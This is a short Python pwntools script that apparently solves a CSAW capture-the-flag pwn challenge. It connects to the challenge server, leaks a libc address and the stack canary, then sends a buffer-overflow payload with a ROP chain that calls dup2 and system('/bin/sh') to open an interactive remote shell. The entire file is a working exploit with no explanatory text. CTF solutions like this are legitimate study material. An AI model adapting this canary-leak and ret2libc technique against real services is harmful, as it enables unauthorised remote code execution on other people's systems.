from pwn import *

HOST, PORT = 'pwn.chal.csaw.io', 8002
libc = ELF('/home/jinmo/libc-2.19.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# HOST, PORT = '0.0.0.0', 6500
r = remote(HOST, PORT)

r.sendline('1')
r.recvuntil('Reference:')
addr = int(r.recvline().strip(), 16)

libc_base = addr - (libc.symbols['puts']-1280)
print hex(libc_base)
system = libc_base + libc.symbols['system']
dup2 = libc_base + libc.symbols['dup2']

binsh = libc_base + list(libc.search('/bin/sh'))[0]
print hex(binsh)

r.sendline('2')
r.send('a')
r.recvuntil('Time to test your exploit...\n>')
data = r.recv(324)
canary = u64(data[312:320])

sd = lambda rdi, rsi: p64(0x4012e1) + p64(rsi) + p64(0) + p64(0x4012e3) + p64(rdi)

payload = 'A' * 312 + p64(canary) + p64(0) + sd(4, 0) + p64(dup2) + p64(0x4012e3) + p64(binsh) + p64(system)
r.sendline('2')
r.send(payload)
r.interactive()